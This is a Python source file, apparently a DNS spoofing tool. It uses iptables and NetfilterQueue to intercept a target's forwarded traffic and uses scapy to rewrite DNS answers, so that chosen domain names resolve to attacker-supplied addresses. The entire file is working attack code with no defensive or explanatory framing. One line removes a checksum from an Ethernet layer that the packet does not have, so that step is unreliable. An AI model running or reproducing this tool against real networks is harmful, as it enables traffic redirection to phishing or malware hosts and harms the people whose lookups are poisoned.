import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from scapy.all import *
from netfilterqueue import NetfilterQueue
 
 
class Spoof:
    def __init__(self, dictionary, queueNum):
        self.dictionary = dictionary
        self.queueNum = queueNum
        self.queue = NetfilterQueue()
 
    def __call__(self, targetIp):
        print("Spoofing....")
        #{self.queueNum}
        os.system(f'sudo iptables -I FORWARD -d {targetIp} -j NFQUEUE --queue-num 1')
        self.queue.bind(self.queueNum, self.poison)
        try:
            self.queue.run()
            print('queue run: ')
        except KeyboardInterrupt:
            os.system('sudo iptables -D FORWARD -j NFQUEUE --queue-num 1')
            print("[!] iptable rule flushed")
 
    def poison(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNSRR):
            try:
                
                queryName = scapyPacket[DNSQR].qname
                print(queryName)
                if queryName in self.dictionary:
                    scapyPacket[DNS].an = DNSRR(
                        rrname=queryName, rdata=self.dictionary[queryName])
                    scapyPacket[DNS].ancount = 1
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    del scapyPacket[Ether].chksum
                    print("modified", queryName)
                    packet.set_payload(bytes(scapyPacket))
                else:
                    print("not modified")
            except IndexError as error:
                log.error(error)
            packet.set_payload(bytes(scapyPacket))
        return packet.accept()
 

def startDNSaltering(dictionary, targetIp):
    queueNum = 1
    spoof = Spoof(dictionary, queueNum)
    spoof(targetIp)


